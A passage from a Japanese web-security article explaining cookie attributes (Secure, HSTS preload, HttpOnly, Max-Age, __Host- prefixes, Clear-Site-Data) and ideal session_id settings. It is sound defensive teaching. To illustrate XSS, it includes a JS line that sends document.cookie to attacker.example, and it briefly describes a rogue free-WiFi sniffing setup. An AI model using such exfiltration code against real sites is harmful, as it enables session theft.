この攻撃に対する根本的な対策は、サービスが `http://` での通信を一切しないことになってしまう。しかし、そこで 80 ポートを閉じて `http://` を一切受け付け無いようにサーバを設定しても、 Person in the Middle が発生していれば、攻撃者はサーバを介さずに攻撃者と被害者の間で平文通信を擬似的に行うことができてしまうため、それも対策にならない。

もう一つの対策は [Preload HSTS](https://hstspreload.org/) だ。通常 HSTS は、最初の平文通信をリダイレクトする必要があるが、「ブラウザが最初からこのサーバは HSTS に対応している」と知っていれば、ユーザが仮に `http://` なリンクを踏んだり、直接 URL バーに `http://` な URL を入力したりしても、ブラウザが勝手に `https://` に切り替えることができる。そこで、ブラウザに対して「このドメインは `https://` に対応している」ということを事前に登録する仕組みが Preload HSTS だ。これなら Person in the Middle が発生していても、ブラウザは平文通信をしなくなるため攻撃の成立が難しくなるだろう。

ところが、さすがにこれでは全てのブラウザが Preload HSTS 対応し、世界中のドメインを登録するか、世界から平文通信が消え、全てのサーバに対してブラウザが最初から暗号化通信をする世界にならない限り、 Cookie を信用することができなくなってしまう。

そこで、改定中の Cookie の仕様では、同じ名前の Secure 属性付きの Cookie を、平文通信から上書きすることはできないような更新が議論されている。つまり、先のリダイレクトを改ざんした session_id の上書きはできないようになっていくだろう。[^2]

[^2]: https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-06#page-30:~:text=non%2Dsecure%20cookie%20does%20not%20overlay%20an,secure%20cookie


```http
# https に恒久的リダイレクト
308 Permanent Redirect HTTP/1.1
Location: https://example.com
# この上書きはできない
Set-Cookie: session_id=bad-cookie; Path=/; Secure;
```

しかし、この挙動に対応してないブラウザでは上書きができること、上書きでなく別の名前の Cookie の付与は可能であることには注意したい。

:::details Person in the Middle は成立するか?
ネットワークを流れるパケットを盗聴や改竄するという Person in the Middle は、想像しているよりも簡単に発生し得る。あまり詳しくは書かないが、例えば自分がルータなどのネットワーク機器に触れる立場なら、そのルータに繋がったデバイスのパケットを見るのは容易なのが事実だ。

例えばモバイル WiFi ルータの名前を「その場所にありそうなフリー Wifi の名前」にして置いておけば、無料 Wifi があると思って繋いでくる人がいそうなことは容易に想像できるだろう。その状態で、流れてくる信号が平文だったら HTTP Body にあるパスワードも、 Header にある Cookie も、 HTML に埋め込まれた個人情報も全部見放題だ。

それらの行為を社会的に防ぐのが法律で、技術的に防ぐのが暗号化だ。近年 Web を始めインターネット全般が「全ての通信を暗号化する」ことでそうしたことを防ぐ方向に動いている。

(平成では Man in the Middle と呼ばれていたため、古い情報を探す際はそちらのほうが見つかりやすいかもしれない。)
:::


## HttpOnly と JS の API

ここまでの設定で経路上での Cookie の漏洩などについて解説してきた。しかし Cookie は JS からアクセスすることもできるため、 XSS があれば簡単に盗み出せてしまう。


```js
const cookie = document.cookie // "session_id=YWxpY2U"
fetch(`https://attacker.example/?${cookie}`)
```

盗まなくても、好きに書き換えて代入しなおせば上書きすることができる。ここには属性も含めることが可能だ。


```js
document.cookie = "session_id=bad-cookie; Path=/; Secure"
```

ここで HttpOnly 属性をつけると、その Cookie は HTTP ヘッダでは送られるが、 JS からはアクセスできなくなるため、こうした攻撃を防ぐことができる。


```js
Set-Cookie: session_id=YWxpY2U; Path=/; Secure; HttpOnly;
```

基本的に Credential となる Session Cookie は、サーバとの Session の維持のために使われ、 JS から取得する必要を無くし HttpOnly にするべきだ。

:::details JS のデータストアとしての Cookie
JS でリッチな UI を構築する流れが始まってから LocalStorage が普及するまでの間は、 `document.cookie` が大体として使われていた時代がある。
LocalStorage や Indexed DB が普及した現在、 JS からアクセスするストレージとして基本的にそれらを利用する方が良いだろう。
それでも Cookie に保存することで HTTP でも送られつつ JS からもアクセスしたいというケースは無くはない。そうしたケースでは必ず別の Cookie を定義し session_id のような Credential 値とは混ぜないように注意する必要がある。
:::


## Max-Age による有効期限

Cookie には有効期限があり、クライアントがその Cookie をいつまで送り続けるのかを `max-age` 属性に秒数で指定する。


```http
Set-Cookie: session_id=YWxpY2U; Path=/; Max-Age=2592000
```

しかし、他のサイトの Cookie が増えていき、ブラウザに保存できる限界を超えると古いものから消されることがあるため、**指定した時間確実に残ることは保証されるわけではない** という点には注意したい。

通常、長期の保存を意図しても一年以上を指定する意味はないだろう。また、 session_id は長くしすぎると攻撃が発生している場合の影響が拡大していく可能性があるため、 3 ヶ月や 1 週間などにし、頻繁に利用していれば Session は維持され続けるが、連続して使わない日々が一定期間続くと、再訪時に認証を求めるといった実装が一般的だろう。

Session Cookie の起源を長くする時、最も恐るべきリスクは、「実は攻撃者が session_id の盗み出しに成功しており、別でログインしてユーザの行動をひっそりと見ている」という状況だろう。そこで Session を維持する中でも session_id の値を定期的に更新したり、重要な情報へのアクセスには再度認証を強制するなどの対策が考えられる。また Session オブジェクトの中に認証時の IP アドレスや User-Agent を保存しておき、アクセスしてきた環境があまりにも違ったら、認証などで確認を促すサイトもあるだろう。意図した Cookie が、意図したブラウザから、意図した通りに送られているかは、常に疑うくらいでもおかしくは無いと筆者は考えている。

TODO: (NIST に cookie 期限あったっけ?)

:::details ブラウザを閉じると消える cookie
Max-Age の無い Set-Cookie の場合 Cookie はブラウザが閉じると消えるという挙動になる。

今ではブラウザが立ち上げっぱなしの人も多いだろうが、昔は今と違い、用が済むとブラウザをいちいち閉じたり、さらには PC をオフにするのが一般的だった。この「ブラウザが閉じる」ことをセッション終了と考え、そこで消える有効期限を指定しない Cookie を、 Session Cookie と呼ぶことがあった。それはここまで解説してきた Session Cookie と意味が違うためややこしい。

現在では、多くのサービスが明示的にログアウトするか長期間使用しない状態が続くまではセッションを維持し、ブラウザを閉じるたびにログアウトするなどと言ったことはしないだろう。つまり、少なくとも session_id には Max-Age を指定するのが一般であり、その期間をコントロールする実装が通常だ。以降「ブラウザを閉じたら消える」意味での Session Cookie は解説には出てこない。
:::

また、かつては Max-Age ではなく Expires 属性に日付を指定し、そこまでの期間を有効にするという指定方法があった。


```http
Set-Cookie: session_id=YWxpY2U; Expires=Sun, 02 Feb 2020 02:02:02 GMT
```

しかし、 Expires は保存している OS の時間を元に計算されるため、 OS の時間設定をずらすことでごまかすことができてしまう。これに起因する攻撃をふせぐためには「絶対時間指定」ではなく「相対時間指定」であり、ブラウザが受信した時点からの経過時間で管理できるほうが望ましいとして、 Max-Age が提案された。[^3]

[^3]: 同じことは、ブラウザキャッシュをコントロールする Expires ヘッダから Cache-Control ヘッダへの max-age 属性の追加でも行われている。

現在のブラウザのほとんどは Max-Age に対応しているが、対応していないブラウザのために両方送るサービスもある。 Expires にしか対応してないブラウザに Max-Age だけを送った場合は、期限を指定してない Cookie としてブラウザを閉じたら消えるだろうと予想される。


## Cookie Prefixes

ここまで何度か解説したように、 Cookie は別のドメインやパスからの Injection や、平文通信の改竄などによって書き換えられている可能性が常にある。そして Cookie ヘッダにはどのような属性で保存された値なのかという情報が一切ない。


```http
# Secure を指定して想定した正規のヘッダ
Set-Cookie: session_id=YWxpY2U; Secure

# 改竄され Secure を消されたヘッダ
Set-Cookie: session_id=YWxpY2U;

# どちらも同じ Cookie ヘッダで送られる
Cookie: session_id=YWxpY2U
```

TODO: Cookie ヘッダに属性を付与してるサンプルが無いかチェック

保存されている属性の値も一緒に送られてくれば確認できるが、今更 Cookie ヘッダの仕様を変えるわけにはいかない。そこで提案されたのが Cookie Prefix という仕様だ。

まず、 Secure 属性が確実についていて欲しい Cookie は、その Cookie 名の頭に `__Secure-` という接頭辞をつける。すると、ブラウザはその Cookie に Secure 属性がついていない場合は保存しなくなる。攻撃者が Prefix を外したら、サービスが知っているキーと変わってしまうため外すことはできない。

逆を言えば、ブラウザから送られてくる `__Secure-` がついた Cookie は、確実に Secure 属性がついており `https://` でしか送られていないことが保証できるのだ。


```http
# 保存される
Set-Cookie: __Secure-session_id=YWxpY2U; Secure

# 保存されない
Set-Cookie: __Secure-session_id=YWxpY2U

# Secure 属性がついてることが保証される
Cookie: __Secure-session_id=YWxpY2U
```

これをさらに強力にしたのが `__Host-` だ。これは Secure 属性があり、 Path 属性が `/` で、 Doamin 属性が無い場合しか保存されなくなる。


```http
Set-Cookie: __Host-session_id=YWxpY2U; Secure; Path=/;
```

送られてくる Cookie は、 `http://` 通信で送られたり、サブドメインに送られてないことが保証でき、まさしく session_id の用途に利用できる。

ブラウザが対応していない場合は、単にそういうヘッダ名な Cookie として扱われるだけなので、互換を壊さないため、導入の敷居は低く改竄に対する対策に利用することができる。


## Cookie の削除と Clear-Site-Data

Cookie の削除には、長らく明示的な API がなかったが。そこで、消したい Cookie の値を空にしつつ有効期限切れにするという方法がとられる。 session_id の場合は削除がセッションの終了になるため、ログアウト処理などで行われる。


```
Set-Cookie: session_id= Max-Age=0;
```

もし HttpOnly が付与されていない場合は、 JS の API から消すことも可能だ。


```js
document.cookie="session_id=; Max-Age=0"
```

最近では、明示的にブラウザが保存している情報を削除する `Clear-Site-Data` ヘッダが提案されており、実装が進んでいる。このヘッダは localStorage やブラウザキャッシュの削除なども含まれているが、以下のように設定すればサイトに保存されている Cookie を全て削除することが可能だ。


```http
Clear-Site-Data: "cookies"
```


## Cookie の用途と属性のまとめ

Cookie の用途は session_id だけではない。例えばユーザごとの設定を保存する用途にも使用されてきた。


```http
# ユーザのテーマ設定の保存
Set-Cookie: theme=aqua
```

そうした設定も、リクエストに載せて送られてくることでサーバで分岐してレスポンスを変えることができるが、そうした情報もサーバ側で session_id に紐づいて保存されるか、 JS から扱いやすいように LocalStorage などに保存されるのが一般的になった。

したがって Cookie の中心的な用途は session_id であり、その理想的な設定の一例は以下のようになるだろう。

- 安全な乱数を元に生成した値を利用
- Path 属性を `/` にしサイト全体で利用
- Max-Age 属性を長めにして明示的にログアウトするまでセッションを維持
- Secure 属性を付与し https のみで送信されるように
- Domain 属性を付与せず、余計なサブドメインに送信しない
- HttpOnly 属性を付与し、 JS API からさわれないように
- SameSite 属性を Lax にし、画面遷移以外では別ドメインに送られないように


```http
Set-Cookie: __Host-session_id=YWxpY2U; Path=/; Max-Age=2592000; Secure; HttpOnly; SameSite=Lax
```
